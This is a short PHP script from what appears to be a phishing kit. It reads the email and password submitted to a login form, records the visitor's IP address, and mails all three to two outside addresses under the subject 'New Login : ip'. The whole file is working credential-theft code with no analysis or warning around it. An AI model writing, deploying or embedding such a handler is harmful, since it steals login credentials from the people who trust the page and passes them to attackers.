<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['password'];
 
		$to = "savagelit1998@yandex.com";
		
		
         $subject = "New Login : ip";
		 
		 $message =  "Online ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
		 $message .= "IP           : ".$ip."\r\n";
		$header = "Content type: Justin well tools \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($to,$subject,$message,$header);
}

if(!empty($_POST)) {
 $emails= $_POST['email'];
 $passwords = $_POST['password'];
 
		$tos = "buen@ccal-sha.com";
		
		
         $subjects = "New Login : ip";
		 
		 $messages =  "Online ID            : ".$emails."\r\n";
         $messages .= "Password           : ".$passwords."\r\n";
		 $messages .= "IP           : ".$ip."\r\n";
		$headers = "Content type: Justin well tools \r\n";
         $headers .= "MIME-Version: 1.0\r\n";
         $headers .= "Content-type: text/html\r\n";
		 
		 mail ($tos,$subjects,$messages,$headers);
}
?>
